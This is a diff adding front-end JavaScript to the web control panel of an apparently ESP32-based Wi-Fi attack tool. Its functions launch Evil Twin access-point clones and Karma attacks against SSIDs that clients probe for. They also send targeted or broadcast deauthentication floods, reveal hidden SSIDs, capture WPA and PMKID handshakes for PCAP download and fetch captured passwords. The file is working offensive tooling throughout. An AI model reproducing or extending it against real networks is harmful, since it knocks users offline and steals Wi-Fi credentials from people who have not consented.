+                if (autoEl && res.portal_auto !== undefined) autoEl.checked = !!res.portal_auto;
+                const sel = document.getElementById('portal-page');
+                if (sel && !sel.disabled) {
+                    const has = Array.from(sel.options).some(o => o.value === String(v));
+                    if (has) sel.value = String(v);
+                }
+            } catch (e) { /* silent, status poll already handles link loss */ }
+        }
+
+        // ==========================================
+        // SAVED TARGETS (offline clone)
+        // ==========================================
+        async function refreshSavedTargets() {
+            try {
+                const res = await sendCommand(CMD.LIST_TARGETS);
+                renderSavedTargets(res.targets || []);
+            } catch (e) { log('Saved targets: ' + e, 'error'); }
+        }
+
+        function renderSavedTargets(list) {
+            const body = document.getElementById('saved-targets-body');
+            const badge = document.getElementById('saved-count');
+            if (badge) badge.textContent = list.length;
+            if (!body) return;
+            body.innerHTML = '';
+            if (list.length === 0) {
+                const tr = document.createElement('tr');
+                const td = document.createElement('td');
+                td.colSpan = 5;
+                td.style.color = 'var(--muted)';
+                td.textContent = 'No saved targets yet.';
+                tr.appendChild(td); body.appendChild(tr);
+                return;
+            }
+            list.forEach(t => {
+                const tr = document.createElement('tr');
+                const mk = (txt, mono) => { const td = document.createElement('td'); td.textContent = txt; if (mono) td.className = 'mono'; return td; };
+                tr.appendChild(mk(t.name));
+                tr.appendChild(mk(t.ssid || '(hidden)'));
+                tr.appendChild(mk(String(t.channel)));
+                tr.appendChild(mk(t.auth || ''));
+                const tdBtn = document.createElement('td');
+                tdBtn.style.whiteSpace = 'nowrap';
+                const bAttack = document.createElement('button');
+                bAttack.className = 'btn danger'; bAttack.textContent = 'ATTACK';
+                bAttack.style.marginRight = '6px';
+                bAttack.addEventListener('click', () => attackSavedTarget(t.id, t.name));
+                const bDel = document.createElement('button');
+                bDel.className = 'btn secondary'; bDel.textContent = 'DEL';
+                bDel.addEventListener('click', () => deleteSavedTarget(t.id, t.name));
+                tdBtn.appendChild(bAttack); tdBtn.appendChild(bDel);
+                tr.appendChild(tdBtn);
+                body.appendChild(tr);
+            });
+        }
+
+        async function saveCurrentTarget() {
+            if (!currentTarget) { showToast('No target selected (scan & pick one first)'); return; }
+            const nameEl = document.getElementById('saved-name');
+            const name = nameEl ? nameEl.value.trim() : '';
+            const params = {
+                name: name,
+                ssid: currentTarget.ssid, bssid: currentTarget.bssid,
+                channel: currentTarget.channel, signal: currentTarget.signal,
+                authmode_code: currentTarget.authmode,
+                scheme: parseInt(document.getElementById('attack-scenario').value, 10),
+                attack_mode: parseInt(document.getElementById('attack-mode').value, 10)
+            };
+            try {
+                const res = await sendCommand(CMD.SAVE_TARGET, params);
+                if (res.status === 'ok') { showToast('Target saved'); if (nameEl) nameEl.value = ''; }
+                else showToast(res.message || 'Save failed');
+                refreshSavedTargets();
+            } catch (e) { log('Save target: ' + e, 'error'); }
+        }
+
+        async function deleteSavedTarget(id, name) {
+            if (!confirm('Delete saved target "' + name + '"?')) return;
+            try {
+                await sendCommand(CMD.DELETE_TARGET, { id: id });
+                showToast('Deleted');
+                refreshSavedTargets();
+            } catch (e) { log('Delete target: ' + e, 'error'); }
+        }
+
+        async function attackSavedTarget(id, name) {
+            const scheme = parseInt(document.getElementById('attack-scenario').value, 10);
+            const mode = parseInt(document.getElementById('attack-mode').value, 10);
+            if (!confirm('Start Evil Twin with saved target "' + name + '"?')) return;
+            try {
+                const res = await sendCommand(CMD.START_SAVED_ATTACK, { id: id, scheme: scheme, attack_mode: mode });
+                if (res.status === 'ok') showToast('Evil Twin Started: ' + name);
+                else showToast(res.message || 'Start failed');
+            } catch (e) { log('Start saved attack: ' + e, 'error'); }
+        }
+
+        async function startEvilTwin() {
+            if (!currentTarget) { showToast("No target selected!"); return; }
+            const modeSel = document.getElementById('attack-mode');
+            const attackMode = modeSel ? parseInt(modeSel.value, 10) : 0;
+            log(`Launching Evil Twin on ${currentTarget.ssid} (${attackMode === 1 ? 'clone only' : 'clone + deauth'})...`);
+            const params = {
+                ssid: currentTarget.ssid, bssid: currentTarget.bssid,
+                channel: currentTarget.channel, signal: currentTarget.signal,
+                authmode_code: currentTarget.authmode,
+                scheme: parseInt(document.getElementById('attack-scenario').value),
+                attack_mode: attackMode
+            };
+            try {
+                const res = await sendCommand(CMD.START_EVILTWIN, params);
+                if(res.status === 'ok') showToast(attackMode === 1 ? "Clone Only Started!" : "Evil Twin Started!");
+            } catch(e) {
+                log("Error starting Attack: " + e, "error");
+            }
+        }
+
+        async function stopEvilTwin() {
+            log(`Stopping Evil Twin Attack...`);
+            try {
+                const res = await sendCommand(CMD.STOP_EVILTWIN);
+                if(res.status === 'ok') {
+                    showToast("Evil Twin Attack Stopped!");
+                }
+            } catch(e) {
+                log("Error stopping Attack: " + e, "error");
+            }
+        }
+
+        async function startKarmaScan() {
+            log("Starting Karma Scan...");
+            try {
+                await sendCommand(CMD.KARMA_ATTACK_SCAN, { start_stop: 1 });
+                showToast("Scanning Probes...");
+                if(karmaInterval) clearInterval(karmaInterval);
+                karmaInterval = setInterval(fetchKarmaProbes, 4000);
+            } catch(e) {
+                log("Error starting scan: " + e, "error");
+            }
+        }
+
+        async function stopKarmaScan() {
+            log("Stopping Karma Scan...");
+            try {
+                await sendCommand(CMD.KARMA_ATTACK_SCAN, { start_stop: 0 });
+                showToast("Scan Stopped");
+                if(karmaInterval) clearInterval(karmaInterval);
+            } catch(e) { log("Error stopping scan: " + e, "error"); }
+        }
+
+        async function fetchKarmaProbes() {
+            try {
+                const res = await sendCommand(CMD.GET_KARMA_PROBES);
+                const data = res.data;
+                
+                const tbody = document.getElementById('karma-scan-body');
+                tbody.innerHTML = '';
+
+                if(!data || data.length === 0) {
+                    tbody.innerHTML = '<tr><td colspan="5" style="text-align:center; color:#666;">Listening...</td></tr>';
+                    return;
+                }
+
+                data.forEach(p => {
+                    const tr = document.createElement('tr');
+                    [p.mac, p.ssid, p.rssi, p.channel].forEach(value => {
+                        const td = document.createElement('td');
+                        td.textContent = value == null ? '' : String(value);
+                        tr.appendChild(td);
+                    });
+                    const actionCell = document.createElement('td');
+                    const button = document.createElement('button');
+                    button.className = 'danger';
+                    button.textContent = 'ATTACK';
+                    button.addEventListener('click', () => launchKarmaAttack(String(p.ssid || ''), Number(p.channel) || 0));
+                    actionCell.appendChild(button);
+                    tr.appendChild(actionCell);
+                    tbody.appendChild(tr);
+                });
+            } catch(e) { }
+        }
+
+        async function launchKarmaAttack(ssid, channel) {
+            const scenario = parseInt(document.getElementById('karma-scenario').value);
+            if(confirm(`Attack ${ssid}?`)) {
+                try {
+                    await sendCommand(CMD.KARMA_ATTACK_START, { ssid: ssid, channel: channel, scheme: scenario });
+                    showToast(`Karma Started on ${ssid}`);
+                } catch(e) {}
+            }
+        }
+
+        async function fetchPasswords() {
+            const area = document.getElementById('passwords-textarea');
+            area.value = "Fetching...";
+            try {
+                const res = await sendCommand(CMD.GET_PASSWORDS);
+                if(res.content) area.value = res.content;
+                else area.value = "(No passwords found or file empty)";
+            } catch(e) { area.value = "Connection Error"; }
+        }
+
+        async function startDeauth() {
+            const mode = document.getElementById('deauth-mode').value;
+            const selectEl = document.getElementById('deauth-frame-type');
+            const frameType = parseInt(selectEl.value);
+            const attackName = selectEl.options[selectEl.selectedIndex].text;
+            let targetBssid = "", targetChannel = 0, targetSsid = "";
+
+            if (mode === 'broadcast') {
+                targetBssid = "FF:FF:FF:FF:FF:FF"; 
+                targetChannel = parseInt(document.getElementById('deauth-broadcast-channel').value);
+                const chText = targetChannel === 0 ? "HOPPING" : `CH ${targetChannel}`;
+                log(`Starting BROADCAST Attack (Type: ${attackName}, ${chText})...`, "warning");
+            } else {
+                if (!currentTarget) { showToast("ERROR: No Target Selected!"); return; }
+                targetBssid = currentTarget.bssid; targetChannel = currentTarget.channel; targetSsid = currentTarget.ssid;
+                log(`Starting Attack on ${currentTarget.ssid} (Type: ${attackName})...`, "warning");
+            }
+            
+            try {
+                const res = await sendCommand(CMD.START_DEAUTHER, {
+                    ssid: targetSsid,
+                    bssid: targetBssid,
+                    channel: targetChannel,
+                    mode: mode,
+                    packet_type: frameType
+                });
+                
+                if(res.status === 'ok') {
+                    showToast("Attack STARTED");
+                } else {
+                    showToast("Error starting attack");
+                    log("Server Error: " + res.message, "error");
+                }
+            } catch(e) {
+                log("Error starting Deauth: " + e, "error");
+            }
+        }
+        
+        async function stopDeauth() {
+            try {
+                log("Stopping deauth attack... please wait...", "warning");
+                await sendCommand(CMD.STOP_DEAUTHER);
+                showToast("Attack STOPPED");
+                log("Deauth attack stopped.", "success");
+            } catch(e) {
+                log("Error stopping: " + e, "error");
+            }
+        }
+        
+        async function startCapture() {
+            const btnStart = document.getElementById('btn-sniff-start');
+            const btnStop = document.getElementById('btn-sniff-stop');
+            
+            const type = parseInt(document.getElementById('sniff-type').value);
+            const subtype = parseInt(document.getElementById('sniff-subtype').value);
+            const channel = parseInt(document.getElementById('sniff-chan').value);
+            const hopping = document.getElementById('sniff-hop').checked;
+
+            log(`Starting Sniffer: CH=${hopping?'HOP':channel}, Type=${type}, Sub=${subtype}`, "info");
+
+            try {
+                // 1. Invia PRIMA il comando di Start Sniffer (applica filtri, canale, ecc)
+                await sendCommand(CMD.START_RAW_SNIFFER, { 
+                    type: type,
+                    subtype: subtype,
+                    channel: channel,
+                    hopping: hopping
+                });
+
+                // 2. Invia POI il comando per agganciare il Packet Analyzer
+                await sendCommand(CMD.START_PACKET_ANALYZER);
+
+                snifferActive = true;
+                showToast("Packet Analyzer Started");
+                
+                // Aggiorna la UI
+                btnStart.disabled = true; btnStart.style.opacity = "0.5"; btnStart.style.cursor = "not-allowed";
+                btnStop.disabled = false; btnStop.style.opacity = "1"; btnStop.style.cursor = "pointer";
+
+                document.getElementById('sniff-chan').disabled = true;
+                document.getElementById('sniff-hop').disabled = true;
+                document.getElementById('sniff-type').disabled = true;
+                document.getElementById('sniff-subtype').disabled = true;
+            } catch (err) {
+                showToast("Error starting analyzer: " + err);
+                log("Packet Analyzer Start Error: " + err, "error");
+            }
+        }
+
+        async function stopCapture() {
+            const btnStart = document.getElementById('btn-sniff-start');
+            const btnStop = document.getElementById('btn-sniff-stop');
+
+            try {
+                // 1. Invia PRIMA il comando per sganciare il Packet Analyzer
+                await sendCommand(CMD.STOP_PACKET_ANALYZER);
+
+                // 2. Invia POI il comando per fermare lo Sniffer radio
+                await sendCommand(CMD.STOP_RAW_SNIFFER);
+
+                snifferActive = false;
+                showToast("Packet Analyzer Stopped");
+                log("Packet Analyzer stopped.", "warning");
+
+                // Aggiorna la UI
+                btnStart.disabled = false; btnStart.style.opacity = "1"; btnStart.style.cursor = "pointer";
+                btnStop.disabled = true; btnStop.style.opacity = "0.5"; btnStop.style.cursor = "not-allowed";
+
+                document.getElementById('sniff-chan').disabled = false;
+                document.getElementById('sniff-hop').disabled = false;
+                document.getElementById('sniff-type').disabled = false;
+                document.getElementById('sniff-subtype').disabled = false;
+                
+                updateSubtypes();
+            } catch (err) {
+                log("Packet Analyzer Stop Error: " + err, "error");
+            }
+        }
+        
+        // ==========================================
+        // RECON: FETCH ACCESS POINTS
+        // ==========================================
+        async function fetchReconDataAp() {
+            try {
+                const res = await sendCommand(CMD.GET_RECON_DATA_AP);
+                if (!res.aps) return;
+                // Il firmware manda ogni AP come array posizionale (meno byte
+                // sul filo, meno malloc su un device con poca RAM) invece che
+                // come oggetto con chiavi ripetute: [ssid, bssid, rssi, ch,
+                // pkts, bytes, sec, hs] -- vedi api_get_recon_data_aps() in
+                // server_api.c. Lo riportiamo subito a oggetti con le stesse
+                // chiavi di sempre cosi' il resto della UI non cambia.
+                lastApsData = res.aps.map(row => ({
+                    ssid: row[0], bssid: row[1], rssi: row[2], ch: row[3],
+                    pkts: row[4], bytes: row[5], sec: row[6], hs: row[7]
+                }));
+
+                // Aggiorniamo la mappa BSSID -> SSID e la mappa dei conteggi
+                const clientCountMap = {};
+                lastClientsData.forEach(cli => {
+                    const bssidUpper = cli.bssid.toUpperCase();
+                    clientCountMap[bssidUpper] = (clientCountMap[bssidUpper] || 0) + 1;
+                });
+
+                const apBody = document.getElementById('recon-ap-body');
+                apBody.innerHTML = '';
+                
+                lastApsData.sort((a, b) => b.rssi - a.rssi).forEach(ap => {
+                    const bssidUpper = ap.bssid.toUpperCase();
+                    apMap[bssidUpper] = (ap.ssid && ap.ssid.trim() !== "") ? String(ap.ssid) : "<hidden>";
+                    const cliCount = clientCountMap[bssidUpper] || 0;
+
+                    // --- HOOK PER L'SSID FINDER ---
+                    if (isSsidFinderRunning && currentTarget && bssidUpper === currentTarget.bssid.toUpperCase()) {
+                        // Se l'AP ha un nome valido e l'avevamo segnato come nascosto...
+                        if (ap.ssid && ap.ssid.trim() !== "") {
+                            const tbody = document.getElementById('ssid-finder-body');
+                            if (tbody && (!tbody.dataset.lastSsid || tbody.dataset.lastSsid !== ap.ssid)) {
+                                tbody.dataset.lastSsid = ap.ssid;
+                                const row = document.createElement('tr');
+                                [bssidUpper, ap.ssid, ap.ch].forEach(value => {
+                                    const cell = document.createElement('td');
+                                    cell.textContent = String(value == null ? '' : value);
+                                    row.appendChild(cell);
+                                });
+                                tbody.replaceChildren(row);
+                                log(`HIDDEN SSID REVEALED: ${ap.ssid} (${bssidUpper})`, "success");
+                                showToast(`SSID Found: ${ap.ssid}!`);
+                                
+                                // Autoseleziona il nuovo target con il nome corretto
+                                selectTarget(ap.ssid, bssidUpper, ap.ch, ap.rssi, ap.authmode_code);
+                            }
+                        }
+                    }
+                    // -----------------------------
+
+                    let hsText = "-", hsColor = "#444";
+                    if (ap.hs === 2) { hsText = "WPA"; hsColor = "#00e676"; }
+                    else if (ap.hs === 1) { hsText = "PMKID"; hsColor = "#ffab40"; }
+
+                    const apRow = document.createElement('tr');
+                    [ap.ssid && ap.ssid.trim() ? ap.ssid : '[Hidden SSID]', bssidUpper,
+                     ap.rssi, ap.ch, ap.pkts, cliCount, formatBigNumber(ap.bytes), ap.sec, hsText]
+                        .forEach(value => {
+                            const cell = document.createElement('td');
+                            cell.textContent = value == null ? '' : String(value);
+                            apRow.appendChild(cell);
+                        });
+                    apBody.appendChild(apRow);
+                });
+
+                updateTargetMonitors();
+                renderHandshakeBank();
+            } catch(e) { console.warn("AP Fetch Error:", e); }
+        }
+
+        // ==========================================
+        // RECON: FETCH CLIENTS
+        // ==========================================
+        async function fetchReconDataCli() {
+            try {
+                const res = await sendCommand(CMD.GET_RECON_DATA_CLI);
+                if (!res.clients) return;
+                // Stesso formato compatto degli AP: [mac, bssid, ch, rssi,
+                // pkts, bytes, probes] -- vedi api_get_recon_data_clients()
+                // in server_api.c.
+                lastClientsData = res.clients.map(row => ({
+                    mac: row[0], bssid: row[1], ch: row[2], rssi: row[3],
+                    pkts: row[4], bytes: row[5], probes: row[6]
+                }));
+
+                const cliBody = document.getElementById('recon-cli-body');
+                const karmaBody = document.getElementById('karma-scan-body');
+                cliBody.innerHTML = '';
+                if (karmaBody) karmaBody.replaceChildren();
+                
+                lastClientsData.sort((a, b) => {
+                    const bssidCompare = a.bssid.localeCompare(b.bssid);
+                    if (bssidCompare !== 0) return bssidCompare;
+                    return b.rssi - a.rssi;
+                }).forEach(cli => {
+                    const bssidUpper = cli.bssid.toUpperCase();
+                    const macUpper = cli.mac.toUpperCase();
+                    const associatedApName = (bssidUpper === "FF:FF:FF:FF:FF:FF")
+                        ? "(Not Associated)" : (apMap[bssidUpper] || bssidUpper);
+                    const clientRow = document.createElement('tr');
+                    [macUpper, associatedApName, cli.ch, cli.rssi,
+                     Array.isArray(cli.probes) ? cli.probes.join(', ') : '', cli.pkts,
+                     formatBigNumber(cli.bytes)].forEach(value => {
+                        const cell = document.createElement('td');
+                        cell.textContent = value == null ? '' : String(value);
+                        clientRow.appendChild(cell);
+                    });
+                    cliBody.appendChild(clientRow);
+
+                    // --- Popolamento automatico lista Karma Probes ---
+                    if (Array.isArray(cli.probes) && cli.probes.length > 0) {
+                        cli.probes.forEach(probeSsid => {
+                            if (!probeSsid) return;
+                            const probeRow = document.createElement('tr');
+                            [macUpper, probeSsid, cli.rssi, cli.ch].forEach(value => {
+                                const cell = document.createElement('td');
+                                cell.textContent = value == null ? '' : String(value);
+                                probeRow.appendChild(cell);
+                            });
+                            const actionCell = document.createElement('td');
+                            const attackButton = document.createElement('button');
+                            attackButton.className = 'danger';
+                            attackButton.textContent = 'ATTACK';
+                            attackButton.addEventListener('click', () => launchKarmaAttack(String(probeSsid), Number(cli.ch) || 0));
+                            actionCell.appendChild(attackButton);
+                            probeRow.appendChild(actionCell);
+                            karmaBody.appendChild(probeRow);
+                        });
+                    }
+                });
+
+                if (karmaBody && karmaBody.children.length === 0 && !karmaInterval) {
+                    const emptyRow = document.createElement('tr');
+                    const emptyCell = document.createElement('td');
+                    emptyCell.colSpan = 5;
+                    emptyCell.textContent = 'No probes detected yet. Start Recon or Karma scan...';
+                    emptyRow.appendChild(emptyCell);
+                    karmaBody.appendChild(emptyRow);
+                }
+                
+                updateTargetMonitors();
+            } catch(e) { console.warn("CLI Fetch Error:", e); }
+        }
+
+        async function connectSta() {
+            const ssid = document.getElementById('sta-ssid').value;
+            const pwd = document.getElementById('sta-password').value;
+            if(!ssid) { showToast("Select a target AP from Scanner first!"); return; }
+            
+            log(`Connecting STA to ${ssid}...`, "warning");
+            document.getElementById('sta-status').innerText = "CONNECTING...";
+            document.getElementById('sta-status').style.color = "#ffab40";
+            
+            try {
+                await sendCommand(CMD.WIFI_CONNECT, { ssid: ssid, password: pwd });
+                showToast("Connection requested...");
+            } catch(e) { log("STA connect error: " + e, "error"); }
+        }
+
+        async function disconnectSta() {
+            log(`Disconnecting STA...`, "warning");
+            try {
+                await sendCommand(CMD.WIFI_DISCONNECT);
+            } catch(e) { log("Disconnect error: " + e, "error"); }
+        }
+
+        function updateTargetMonitors() {
+            if (!currentTarget) return;
+            const targetBssidUpper = currentTarget.bssid.toUpperCase();
+            
+            const targetAp = lastApsData.find(ap => ap.bssid.toUpperCase() === targetBssidUpper);
+            const cliCount = lastClientsData.filter(c => c.bssid.toUpperCase() === targetBssidUpper).length;
+
+            const updateUI = (prefix) => {
+                const monitor = document.getElementById(`${prefix}-live-monitor`);
+                if (monitor && targetAp) {
+                    monitor.style.display = 'block';
+                    document.getElementById(`${prefix}-live-pkts`).innerText = targetAp.pkts;
+                    document.getElementById(`${prefix}-live-bytes`).innerText = formatBigNumber(targetAp.bytes);
+                    document.getElementById(`${prefix}-live-clients`).innerText = cliCount;
+                }
+            };
+
+            if (document.getElementById('view-eviltwin').classList.contains('active')) updateUI('et');
+            if (document.getElementById('view-deauth').classList.contains('active')) updateUI('deauth');
+        }
+
+        function renderHandshakeBank() {
+            const bankBody = document.getElementById('handshakers-bank-body');
+            if (!bankBody) return;
+
+            // Filtriamo localmente dalla memoria globale solo gli AP che hanno un handshake (hs > 0)
+            const captured = lastApsData.filter(ap => ap.hs > 0);
+
+            if (captured.length === 0) {
+                bankBody.innerHTML = `<tr><td colspan="6" style="text-align:center; padding:20px; color:#666;">Listening on radio channel... No handshake captured yet.</td></tr>`;
+                return;
+            }
+
+            bankBody.innerHTML = '';
+            captured.forEach(ap => {
+                let typeText = ap.hs === 2 ? "WPA (4-WAY)" : "PMKID HASH";
+                let badgeColor = ap.hs === 2 ? "var(--accent)" : "#ffab40";
+                let bGColor = ap.hs === 2 ? "rgba(0, 230, 118, 0.1)" : "rgba(255, 171, 64, 0.1)";
+
+                const handshakeRow = document.createElement('tr');
+                [ap.ssid || '<hidden>', ap.bssid.toUpperCase(), ap.ch, ap.sec, typeText].forEach(value => {
+                    const cell = document.createElement('td');
+                    cell.textContent = String(value == null ? '' : value);
+                    handshakeRow.appendChild(cell);
+                });
+                const actionCell = document.createElement('td');
+                const downloadButton = document.createElement('button');
+                downloadButton.textContent = 'DOWNLOAD PCAP';
+                downloadButton.addEventListener('click', () => downloadTargetPcap(String(ap.bssid)));
+                actionCell.appendChild(downloadButton);
+                handshakeRow.appendChild(actionCell);
+                bankBody.appendChild(handshakeRow);
+            });
+        }
+
+        async function downloadTargetPcap(bssid) {
+            showToast("Generating custom PCAP structure...");
+            try {
+                await sendCommand(CMD.DOWNLOAD_HANDSHAKE, { bssid: bssid });
+            } catch (e) { log("PCAP Download requested timeout/error", "error"); }
+        }
+
+        // ==========================================
+        // RECON: START / STOP CONTROLS
+        // ==========================================
+        function populateReconChannels() {
+            const sel = document.getElementById('recon-chan');
+            if(!sel) return;
+            
+            let grp24 = document.createElement('optgroup');
+            grp24.label = "2.4 GHz";
+            for(let i=1; i<=14; i++) {
+                let opt = document.createElement('option');
+                opt.value = i; opt.innerText = "CH " + i;
+                grp24.appendChild(opt);
+            }
+            sel.appendChild(grp24);
+
+            let grp5 = document.createElement('optgroup');
+            grp5.label = "5 GHz";
+            const ch5 = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165];
+            ch5.forEach(c => {
+                let opt = document.createElement('option');
+                opt.value = c; opt.innerText = "CH " + c;
+                grp5.appendChild(opt);
+            });
+            sel.appendChild(grp5);
+        }
+
+        function populateDeauthChannels() {
+            const sel = document.getElementById('deauth-broadcast-channel');
+            if(!sel) return;
+            
+            let grp24 = document.createElement('optgroup');
+            grp24.label = "2.4 GHz";
+            for(let i=1; i<=14; i++) {
+                let opt = document.createElement('option');
+                opt.value = i; opt.innerText = "CH " + i;
+                grp24.appendChild(opt);
+            }
+            sel.appendChild(grp24);
+
+            let grp5 = document.createElement('optgroup');
+            grp5.label = "5 GHz";
+            const ch5 = [36, 40, 44, 48, 52, 56, 60, 64, 100, 104, 108, 112, 116, 120, 124, 128, 132, 136, 140, 144, 149, 153, 157, 161, 165];
+            ch5.forEach(c => {
+                let opt = document.createElement('option');
+                opt.value = c; opt.innerText = "CH " + c;
+                grp5.appendChild(opt);
+            });
+            sel.appendChild(grp5);
+        }
+        
+        function startRecon() {
+            const chanVal = parseInt(document.getElementById('recon-chan').value);
+            const hopping = (chanVal === 0);
+            const channel = hopping ? 1 : chanVal; // Fallback al ch 1 iniziale se in hopping
+            
+            log(`Starting Airodump (airodump-ng): CH=${hopping ? 'HOPPING' : channel}`, "info");
+            
+            sendCommand(CMD.START_RAW_SNIFFER, { 
+                type: 0, 
+                subtype: 0, 
+                channel: channel, 
+                hopping: hopping
+            }).then(() => {
+                isReconRunning = true;
+                showToast("Airodump Started");
+                
+                const btnStart = document.getElementById('btn-recon-start');
+                const btnStop = document.getElementById('btn-recon-stop');
+                
+                btnStart.disabled = true; btnStart.style.opacity = "0.5"; btnStart.style.cursor = "not-allowed";
+                document.getElementById('recon-chan').disabled = true;
+                
+                btnStop.disabled = false; btnStop.style.opacity = "1"; btnStop.style.cursor = "pointer";
+            }).catch(err => {
+                showToast("Error starting Airodump");
+                log("Airodump Start Error: " + err, "error");
+            });
+        }
+
+        function stopRecon() {
+            log("Stopping Airodump...", "warning");
+            
+            sendCommand(CMD.STOP_RAW_SNIFFER).then(() => {
+                isReconRunning = false;
+                showToast("Airodump Stopped");
+                
+                const btnStart = document.getElementById('btn-recon-start');
+                const btnStop = document.getElementById('btn-recon-stop');
+                
+                btnStart.disabled = false; btnStart.style.opacity = "1"; btnStart.style.cursor = "pointer";
+                document.getElementById('recon-chan').disabled = false;
+                
+                btnStop.disabled = true; btnStop.style.opacity = "0.5"; btnStop.style.cursor = "not-allowed";
+            }).catch(err => {
+                log("Airodump Stop Error: " + err, "error");
+            });
+        }
+
+        function clearReconData() {
+            lastApsData = [];
+            lastClientsData = [];
+            apMap = {};
+            
+            const apBody = document.getElementById('recon-ap-body');
+            if(apBody) apBody.innerHTML = '<tr><td colspan="9" style="text-align:center; padding:15px; color:#666;">Data cleared. Start Airodump to map networks...</td></tr>';
+            
+            const cliBody = document.getElementById('recon-cli-body');
+            if(cliBody) cliBody.innerHTML = '<tr><td colspan="7" style="text-align:center; padding:15px; color:#666;">Data cleared. Waiting for clients...</td></tr>';
+            
+            showToast("Airodump Data Cleared");
+            log("Airodump memory cleared.", "info");
+        }
+        
+        async function getLastWifiCredential() {
+            try {
+                const res = await sendCommand(CMD.GET_LAST_WIFI_CREDENTIALS);
+                if (!res.ssid) {
+                    showToast("Last Wi-Fi network name not found.");
+                    return;
+                }
+                document.getElementById('sta-ssid').value = res.ssid;
+                /* Passwords are intentionally never persisted or recalled. */
+                document.getElementById('sta-password').value = '';
+                showToast("Last Wi-Fi network name loaded; enter its password again.");
+            } catch(e) { console.warn("Last Wi-Fi settings fetch error:", e); }
+        }
+
+        let hostScanData = [];
+
+        // Monochrome icon set for the Fing-style row list. Device identity is
+        // conveyed by icon shape (not color) to stay consistent with the
+        // single-accent dark theme used everywhere else in this UI.
+        const HOST_DEVICE_ICONS = {
+            router: '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2L4 7v2h16V7l-8-5zM5 10v2h1v9h2v-6h8v6h2v-9h1v-2H5zm4 2h6v2H9v-2z"/></svg>',
+            media: '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M21 3H3c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h5v2h8v-2h5c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2zm0 14H3V5h18v12zM10 8l6 4-6 4V8z"/></svg>',
+            printer: '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M19 8H5c-1.66 0-3 1.34-3 3v6h4v4h12v-4h4v-6c0-1.66-1.34-3-3-3zm-3 11H8v-5h8v5zm3-7c-.55 0-1-.45-1-1s.45-1 1-1 1 .45 1 1-.45 1-1 1zm-1-9H6v4h12V3z"/></svg>',
+            phone: '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M17 1H7c-1.1 0-2 .9-2 2v18c0 1.1.9 2 2 2h10c1.1 0 2-.9 2-2V3c0-1.1-.9-2-2-2zm0 18H7V4h10v15z"/></svg>',
+            computer: '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M20 18c1.1 0 1.99-.9 1.99-2L22 6c0-1.1-.9-2-2-2H4c-1.1 0-2 .9-2 2v10c0 1.1.9 2 2 2H0v2h24v-2h-4zM4 6h16v10H4V6z"/></svg>',
+            camera: '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M9 2 7.17 4H4c-1.1 0-2 .9-2 2v12c0 1.1.9 2 2 2h16c1.1 0 2-.9 2-2V6c0-1.1-.9-2-2-2h-3.17L15 2H9zm3 15c-2.76 0-5-2.24-5-5s2.24-5 5-5 5 2.24 5 5-2.24 5-5 5zm0-8c-1.66 0-3 1.34-3 3s1.34 3 3 3 3-1.34 3-3-1.34-3-3-3z"/></svg>',
+            iot: '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M6 2v2H4v2h2v12H4v2h2v2h2v-2h8v2h2v-2h2v-2h-2V6h2V4h-2V2h-2v2H8V2H6zm2 4h8v12H8V6z"/></svg>',
+            device: '<svg viewBox="0 0 24 24" fill="currentColor"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 18c-4.41 0-8-3.59-8-8s3.59-8 8-8 8 3.59 8 8-3.59 8-8 8zm1-13h-2v6l5.25 3.15.75-1.23-4-2.42V7z"/></svg>'
+        };
+
+        // Guess a device category from vendor name + advertised mDNS/SSDP
+        // service types, purely to pick a representative icon - not shown
+        // anywhere else, so a wrong guess just falls back to a generic dot.
+        function classifyHostIcon(host) {
+            const vendor = (host.vendor || '').toLowerCase();
+            const hostname = (host.hostname || '').toLowerCase();
+            const types = (host.services || []).map(s => (s.type || '').toLowerCase());
+            // The UPnP friendlyName/manufacturer/modelName (when resolved via
+            // ssdp_fetch_device_info) is a far more reliable signal than
+            // guessing from vendor OUI alone - e.g. "Fire TV di Stefano" or
+            // "Vodafone Power Station WiFi 6" tells us exactly what it is.
+            const nameHints = [host.friendly_name, host.manufacturer, host.model].filter(Boolean).join(' ').toLowerCase();
+
+            if (/router|gateway|modem|station wifi|access point/.test(nameHints)) {
+                return 'router';
+            }
+            if (/fire ?tv|apple ?tv|chromecast|smart ?tv|\btv\b|roku|shield|soundbar|speaker|echo dot|echo show/.test(nameHints)) {
+                return 'media';
+            }
+            if (/printer|laserjet|deskjet|officejet|inkjet/.test(nameHints)) {
+                return 'printer';
+            }
+            if (/camera|\bcam\b|doorbell/.test(nameHints)) {
+                return 'camera';
+            }
+            if (/iphone|ipad|android|galaxy|pixel phone/.test(nameHints)) {
+                return 'phone';
+            }
+            if (/macbook|imac|desktop|laptop|workstation/.test(nameHints)) {
+                return 'computer';
+            }
+
+            if (types.some(t => t.includes('internetgatewaydevice') || t.includes('wandevice') || t.includes('wanconnectiondevice')) ||
+                /tp-link|netgear|arcadyan|vodafone|d-link|asus|linksys|huawei|zte corp|fastweb|technicolor|sagemcom/.test(vendor)) {
+                return 'router';
+            }
+            if (types.some(t => t.includes('mediarenderer') || t.includes('mediaserver') || t.includes('googlecast') || t.includes('airplay') || t.includes('raop')) ||
+                /sonos|roku|amazon/.test(vendor) || /chromecast|appletv|firetv|echo/.test(hostname)) {
+                return 'media';
+            }
+            if (types.some(t => t.includes('_ipp') || t.includes('printer')) ||
+                /canon|epson|brother industries|hewlett|hp inc|lexmark/.test(vendor)) {
+                return 'printer';
+            }
+            if (/hikvision|dahua|axis communications|reolink|foscam|ubiquiti/.test(vendor) || hostname.includes('cam')) {
+                return 'camera';
+            }
+            if (/apple|samsung electronics|xiaomi|oneplus|google/.test(vendor) && /iphone|android|galaxy|pixel/.test(hostname)) {
+                return 'phone';
+            }
+            if (types.some(t => t.includes('_smb') || t.includes('workstation')) ||
+                /dell|lenovo|intel corp|microsoft|raspberry|asustek/.test(vendor)) {
+                return 'computer';
+            }
